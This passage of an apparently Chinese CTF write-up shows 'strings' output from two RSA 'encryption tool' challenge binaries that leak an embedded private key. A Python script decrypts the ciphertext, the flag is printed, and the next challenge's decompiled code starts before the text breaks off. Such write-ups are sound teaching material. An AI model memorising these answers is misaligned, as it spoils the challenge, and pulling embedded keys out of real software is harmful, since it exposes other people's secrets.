class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(root㉿LAPTOP-BMERJF8L)-[/mnt/e/1215]</span><br><span class="line">└─# strings encryption_tool_old</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">EVP_PKEY_CTX_free</span><br><span class="line">ERR_get_error</span><br><span class="line">PEM_read_bio_PrivateKey</span><br><span class="line">PEM_read_bio_PUBKEY</span><br><span class="line">BIO_free</span><br><span class="line">BIO_new_mem_buf</span><br><span class="line">EVP_PKEY_decrypt_init</span><br><span class="line">EVP_PKEY_encrypt</span><br><span class="line">EVP_PKEY_decrypt</span><br><span class="line">EVP_PKEY_encrypt_init</span><br><span class="line">EVP_PKEY_free</span><br><span class="line">EVP_PKEY_CTX_new</span><br><span class="line">EVP_PKEY_CTX_set_rsa_padding</span><br><span class="line">ERR_error_string</span><br><span class="line">strcpy</span><br><span class="line"><span class="built_in">sleep</span></span><br><span class="line">puts</span><br><span class="line">__stack_chk_fail</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">dlclose</span><br><span class="line">strlen</span><br><span class="line">malloc</span><br><span class="line">__libc_start_main</span><br><span class="line">dlopen</span><br><span class="line">__cxa_finalize</span><br><span class="line"><span class="built_in">printf</span></span><br><span class="line">__isoc99_scanf</span><br><span class="line">memcpy</span><br><span class="line">strcmp</span><br><span class="line">libcrypto.so.3</span><br><span class="line">libc.so.6</span><br><span class="line">OPENSSL_3.0.0</span><br><span class="line">GLIBC_2.14</span><br><span class="line">GLIBC_2.7</span><br><span class="line">GLIBC_2.4</span><br><span class="line">GLIBC_2.34</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">PTE1</span><br><span class="line">u+UH</span><br><span class="line">&lt;=t2</span><br><span class="line">&lt;=t+</span><br><span class="line">[S]Version Checking...</span><br><span class="line">[S]version: 19.198.10</span><br><span class="line">[S]Welcome to the RSA encryption program!!!</span><br><span class="line">[S]Tell me your ciphertext or plaintext:</span><br><span class="line">[S]Ciphertext checking...</span><br><span class="line">[S]Right ciphertext!</span><br><span class="line">[S]Not ciphtertext</span><br><span class="line">[S]Environment checking...</span><br><span class="line">libcrypto.so</span><br><span class="line">[S]No OpenSSL <span class="keyword">in</span> your <span class="built_in">env</span>!! <span class="built_in">exit</span></span><br><span class="line">[S]OpenSSL <span class="built_in">env</span> work</span><br><span class="line">[S]Encrypting your plaintext...</span><br><span class="line">[S]Decrypting your ciphertext...</span><br><span class="line">[S]Error: NULL input</span><br><span class="line">[S]Failed to get private key!</span><br><span class="line">[S]BIO creation failed!</span><br><span class="line">[S]Load private key error: %s</span><br><span class="line">[S]EVP_PKEY_CTX_new error: %s</span><br><span class="line">[S]EVP_PKEY_decrypt_init error: %s</span><br><span class="line">[S]Set padding error: %s</span><br><span class="line">[S]Get output length error: %s</span><br><span class="line">[S]Malloc error!</span><br><span class="line">[S]Decrypt error: %s</span><br><span class="line">[S]Invalid input parameters!</span><br><span class="line">[S]Failed to get public key!</span><br><span class="line">[S]Load public key error: %s</span><br><span class="line">[S]EVP_PKEY_encrypt_init error: %s</span><br><span class="line">[S]Encrypt error: %s</span><br><span class="line">[S]Warning! This version has deprecated, please updata!!</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span><br><span class="line">?456789:;&lt;=</span><br><span class="line"> !<span class="string">&quot;#$%&amp;&#x27;()*+,-./0123</span></span><br><span class="line"><span class="string">9*3$&quot;</span></span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCPsj+c/7xPr54hxUnTWHc9fxqQ</span><br><span class="line">rHkZgoM3VGXTlu7C1UxLFZiWjZ0r8u6SgtFUm4qnKzgpaNRgSL22umNbdIaQCUls</span><br><span class="line">mxozADlYtQ4FOCZUGuDMQe/f8TcVPIuHjIgmNfIPu1+yy4NZDnZfOf6Y7B6jKEJ4</span><br><span class="line">ROfzXCKTuRWS+6pRwQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLVxuTUlJQ2RnSUJBREFOQmdrcWhraUc5dzBCQVFFRkFBU0NBbUF3Z2dKY0FnRUFBb0dCQUkreVA1ei92RSt2bmlIRlxuU2ROWWR6MS9HcENzZVJtQ2d6ZFVaZE9XN3NMVlRFc1ZtSmFOblN2eTdwS0MwVlNiaXFjck9DbG8xR0JJdmJhNlxuWTF0MGhwQUpTV3liR2pNQU9WaTFEZ1U0SmxRYTRNeEI3OS94TnhVOGk0ZU1pQ1kxOGcrN1g3TExnMWtPZGw4NVxuL3Bqc0hxTW9RbmhFNS9OY0lwTzVGWkw3cWxIQkFnTUJBQUVDZ1lCckFlNWxWL3cveXlRVE9mdjBLeGtBN3JvMVxucW5xMENJRDJueDhGSm95L0FtQkNPZDdibnJIQW5MUVUzdDVNQjFpRmpLWFNFSUszQVBSbU12N3lpQi83MjROcFxucVVVU2ZYVmZtekk1aituYzh2UEhEZmpDck9WTXVSZkpUcW44WS91bnY4TVcyemtzN0RiRXdrQnk5OUdTVVYvS1xuL3BGQzJGa2hhbURmUmtoZkFRSkJBTmZ2bmJ3WGk2R1g3U1BmZGxhaWtmUDl6VGlIM1JMc3NHcXlwMEEvVFVzeVxuTGhEcjNmbXVQbFFUeElkSHcxSHplUzNueWQrcjJzejJGc0s4Y09SQlNxa0NRUUNxVzNCQ25qYjZOa0tXSlJ5L1xuekwvM0s0cUQ0T2ZMQWlVTEQrWW8rY3JrQ1B2YXNpZWZmeWx0MkVsZDhPZmxvenRyWDJFVjlyNU94ODdMVXNSWlxuUzVWWkFrRUF1Y0wyQkFpUlkzdHFVeEQ3SWI2TEpzWXhGSyswbklJbnBqSjR0VWwvdWUrNk4yNWhzRmlZWUFYOVxuYkk5czFRUktQQmFKMFRScmJ5VkpJVSt4SW51VXVRSkFmUmYvNnlzNnU2azBaQVNFZytMWjQ2bzVZSFc2UDd3blxuYjJRUlltMXFxdUJkOEUxNkF3amhaeU8zWENBV2FPM2dLQXcxd21jWmY4Z0E5aFNrMGQxS29RSkFhNzVGS1dtTFxuSmhVbFdzK2tHK0tkaEVRTmtWdTBsZnh2N0Jxd2YxL0F6ZGR3QmNiTzFYckQzVmVVRmo3R21STFRMS244cXF0ZVxubHk1MnpEdm01RGx3V0E9PVxuLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0=</span><br><span class="line">The ciphertext was moved///////</span><br><span class="line">GCC: (Ubuntu 14.2.0-4ubuntu2~24.04) 14.2.0</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.gnu.property</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.note.ABI-tag</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.plt.sec</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.dynamic</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br><span class="line"></span><br><span class="line">(base) ┌──(root㉿LAPTOP-BMERJF8L)-[/mnt/e/1215]</span><br><span class="line">└─# strings encryption_tool_new</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">EVP_PKEY_CTX_free</span><br><span class="line">ERR_get_error</span><br><span class="line">PEM_read_bio_PrivateKey</span><br><span class="line">PEM_read_bio_PUBKEY</span><br><span class="line">BIO_free</span><br><span class="line">BIO_new_mem_buf</span><br><span class="line">EVP_PKEY_decrypt_init</span><br><span class="line">EVP_PKEY_encrypt</span><br><span class="line">EVP_PKEY_decrypt</span><br><span class="line">EVP_PKEY_encrypt_init</span><br><span class="line">EVP_PKEY_free</span><br><span class="line">EVP_PKEY_CTX_new</span><br><span class="line">EVP_PKEY_CTX_set_rsa_padding</span><br><span class="line">ERR_error_string</span><br><span class="line">strcpy</span><br><span class="line"><span class="built_in">sleep</span></span><br><span class="line">puts</span><br><span class="line">__stack_chk_fail</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">dlclose</span><br><span class="line">strlen</span><br><span class="line">malloc</span><br><span class="line">__libc_start_main</span><br><span class="line">dlopen</span><br><span class="line">__cxa_finalize</span><br><span class="line"><span class="built_in">printf</span></span><br><span class="line">__isoc99_scanf</span><br><span class="line">memcpy</span><br><span class="line">strcmp</span><br><span class="line">libcrypto.so.3</span><br><span class="line">libc.so.6</span><br><span class="line">OPENSSL_3.0.0</span><br><span class="line">GLIBC_2.14</span><br><span class="line">GLIBC_2.7</span><br><span class="line">GLIBC_2.4</span><br><span class="line">GLIBC_2.34</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">PTE1</span><br><span class="line">u+UH</span><br><span class="line">&lt;=t2</span><br><span class="line">&lt;=t+</span><br><span class="line">[S]Warning! This version has deprecated, please updata!!</span><br><span class="line">[S]Version Checking...</span><br><span class="line">[S]version: 114.5.14 (newest)</span><br><span class="line">[S]Welcome to the RSA encryption program!!!</span><br><span class="line">[S]Tell me your ciphertext or plaintext:</span><br><span class="line">[S]Ciphertext checking...</span><br><span class="line">[S]Right ciphertext!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line">[S]Not ciphtertext</span><br><span class="line">[S]Environment checking...</span><br><span class="line">libcrypto.so</span><br><span class="line">[S]No OpenSSL <span class="keyword">in</span> your <span class="built_in">env</span>!! <span class="built_in">exit</span></span><br><span class="line">[S]OpenSSL <span class="built_in">env</span> work</span><br><span class="line">[S]Encrypting your plaintext...</span><br><span class="line">[S]Decrypting your ciphertext...</span><br><span class="line">[S]Warning!! RSA decrypt func has deprecated</span><br><span class="line">[S]Error: NULL input</span><br><span class="line">[S]Failed to get private key!</span><br><span class="line">[S]BIO creation failed!</span><br><span class="line">[S]Load private key error: %s</span><br><span class="line">[S]EVP_PKEY_CTX_new error: %s</span><br><span class="line">[S]EVP_PKEY_decrypt_init error: %s</span><br><span class="line">[S]Set padding error: %s</span><br><span class="line">[S]Get output length error: %s</span><br><span class="line">[S]Malloc error!</span><br><span class="line">[S]Decrypt error: %s</span><br><span class="line">[S]Warning!! RSA encrypt func has deprecated</span><br><span class="line">[S]Invalid input parameters!</span><br><span class="line">[S]Failed to get public key!</span><br><span class="line">[S]Load public key error: %s</span><br><span class="line">[S]EVP_PKEY_encrypt_init error: %s</span><br><span class="line">[S]Encrypt error: %s</span><br><span class="line">[S]Plesase find the key and <span class="keyword">then</span> <span class="keyword">do</span> what you want :)</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span><br><span class="line">?456789:;&lt;=</span><br><span class="line"> !<span class="string">&quot;#$%&amp;&#x27;()*+,-./0123</span></span><br><span class="line"><span class="string">9*3$&quot;</span></span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCPsj+c/7xPr54hxUnTWHc9fxqQ</span><br><span class="line">rHkZgoM3VGXTlu7C1UxLFZiWjZ0r8u6SgtFUm4qnKzgpaNRgSL22umNbdIaQCUls</span><br><span class="line">mxozADlYtQ4FOCZUGuDMQe/f8TcVPIuHjIgmNfIPu1+yy4NZDnZfOf6Y7B6jKEJ4</span><br><span class="line">ROfzXCKTuRWS+6pRwQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">UEtuNkI3eHo5QU0zd3d3TllablFJeDJSbkNEUUw1MlhxMU05em5CTXhCeHdSUUpKTGRhRE5RN1h5VkVhS3MvcjVyM0QyV0pTNkhKVWFwdU8yMHZFc01XRnlOdXplUUhWeHJRUkx3OHZIWFQvcGdDNWtPanZyZVJES0xnbVdlam4wa2xMUWJrQVJveDlmN1ErMXgzNzBZSUZvdUxyTlFVakpPVHlLdUdtdWtrPQ==</span><br><span class="line">GCC: (Ubuntu 14.2.0-4ubuntu2~24.04) 14.2.0</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.gnu.property</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.note.ABI-tag</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.plt.sec</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.dynamic</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP, PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA1, SHA256</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 私钥（确保格式正确）</span></span><br><span class="line">private_key_pem = <span class="string">&quot;&quot;&quot;-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAI+yP5z/vE+vniHF</span></span><br><span class="line"><span class="string">SdNYdz1/GpCseRmCgzdUZdOW7sLVTEsVmJaNnSvy7pKC0VSbiqcrOClo1GBIvba6</span></span><br><span class="line"><span class="string">Y1t0hpAJSWybGjMAOVi1DgU4JlQa4MxB79/xNxU8i4eMiCY18g+7X7LLg1kOdl85</span></span><br><span class="line"><span class="string">/pjsHqMoQnhE5/NcIpO5FZL7qlHBAgMBAAECgYBrAe5lV/w/yyQTOfv0KxkA7ro1</span></span><br><span class="line"><span class="string">qnq0CID2nx8FJoy/AmBCOd7bnrHAnLQU3t5MB1iFjKXSEIK3APRmMv7yiB/724Np</span></span><br><span class="line"><span class="string">qUUSfXVfmzI5j+nc8vPHDfjCrOVMuRfJTqn8Y/unv8MW2zks7DbEwkBy99GSUV/K</span></span><br><span class="line"><span class="string">/pFC2FkhamDfRkhfAQJBANfvnbwXi6GX7SPfdlaikfP9zTiH3RLssGqyp0A/TUsy</span></span><br><span class="line"><span class="string">LhDr3fmuPlQTxIdHw1HzeS3nyd+r2sz2FsK8cORBSqkCQQCqW3BCnjb6NkKWJRy/</span></span><br><span class="line"><span class="string">zL/3K4qD4OfLAiULD+Yo+crkCPvasieffylt2Eld8OfloztrX2EV9r5Ox87LUsRZ</span></span><br><span class="line"><span class="string">S5VZAkEAucL2BAiRY3tqUxD7Ib6LJsYxFK+0nIInpjJ4tUl/ue+6N25hsFiYYAX9</span></span><br><span class="line"><span class="string">bI9s1QRKPBaJ0TRrbyVJIU+xInuUuQJAfRf/6ys6u6k0ZASEg+LZ46o5YHW6P7wn</span></span><br><span class="line"><span class="string">b2QRYm1qquBd8E16AwjhZyO3XCAWaO3gKAw1wmcZf8gA9hSk0d1KoQJAa75FKWmL</span></span><br><span class="line"><span class="string">JhUlWs+kG+KdhEQNkVu0lfxv7Bqwf1/AzddwBcbO1XrD3VeUFj7GmRLTLKn8qqte</span></span><br><span class="line"><span class="string">ly52zDvm5DlwWA==</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">ciphertext_b64 = <span class="string">&quot;PKn6B7xz9AM3wwwNYZnQIx2RnCDQL52Xq1M9znBMxBxwRQJJLdaDNQ7XyVEaKs/r5r3D2WJS6HJUapuO20vEsMWFyNuzeQHVxrQRLw8vHXT/pgC5kOjvreRDKLgmWejn0klLQbkARox9f7Q+1x370YIFouLrNQUjJOTyKuGmukk=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_rsa</span>():   </span><br><span class="line">    <span class="comment"># 1. 加载私钥</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        private_key = RSA.import_key(private_key_pem)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;✅ 私钥加载成功&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;   密钥大小: <span class="subst">&#123;private_key.size_in_bits()&#125;</span> bits&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 私钥加载失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 解码密文</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ciphertext = b64decode(ciphertext_b64)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;✅ 密文解码成功&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;   密文长度: <span class="subst">&#123;<span class="built_in">len</span>(ciphertext)&#125;</span> bytes (<span class="subst">&#123;<span class="built_in">len</span>(ciphertext)*<span class="number">8</span>&#125;</span> bits)&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查密文长度是否符合1024位RSA</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ciphertext) == <span class="number">128</span>:  <span class="comment"># 1024位 = 128字节</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   ✅ 密文长度符合1024位RSA&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   ⚠️  密文长度异常: 期望128字节，实际<span class="subst">&#123;<span class="built_in">len</span>(ciphertext)&#125;</span>字节&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 密文解码失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;尝试不同的解密方式...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 尝试PKCS1_v1_5解密（最常用）</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n1. 尝试PKCS1_v1_5解密:&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cipher = PKCS1_v1_5.new(private_key)</span><br><span class="line">        decrypted = cipher.decrypt(ciphertext, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> decrypted:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   ✅ 解密成功!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   解密结果: <span class="subst">&#123;decrypted&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   十六进制: <span class="subst">&#123;binascii.hexlify(decrypted).decode()&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;   文本(UTF-8): <span class="subst">&#123;decrypted.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;   文本(GBK): <span class="subst">&#123;decrypted.decode(<span class="string">&#x27;gbk&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;   无法解码为常见文本格式&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;   ❌ 解密失败: 无效填充&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;   ❌ 解密出错: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    decrypt_rsa()</span><br></pre></td></tr></table></figure>
<p><strong>CBCTF{nev3r_1e@k_y00r_PR1V@t3_k8Y}</strong></p>
<ul>
<li>BF5</li>
</ul>
<blockquote>
<p>不能玩战地6的T0FV404深陷绝望之中，只能用战地5捞薯条解决乏闷，结果管理员直接把他踢了，需要flag来重新登录，你能帮帮他吗？(建议做完本题后在去做BF6)</p>
</blockquote>
<p>点到主函数看看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_411D00</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  __int64 v2; <span class="comment">// [esp-8h] [ebp-124h]</span></span><br><span class="line">  <span class="type">char</span> *Block; <span class="comment">// [esp+D0h] [ebp-4Ch]</span></span><br><span class="line">  _DWORD v4[<span class="number">3</span>]; <span class="comment">// [esp+DCh] [ebp-40h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [esp+E8h] [ebp-34h]</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">4</span>]; <span class="comment">// [esp+F4h] [ebp-28h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+F8h] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+FCh] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+100h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+104h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+108h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+10Ch] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+110h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+11Ch] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_411325(&amp;unk_41C0A3);</span><br><span class="line">  *(_DWORD *)Str = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span 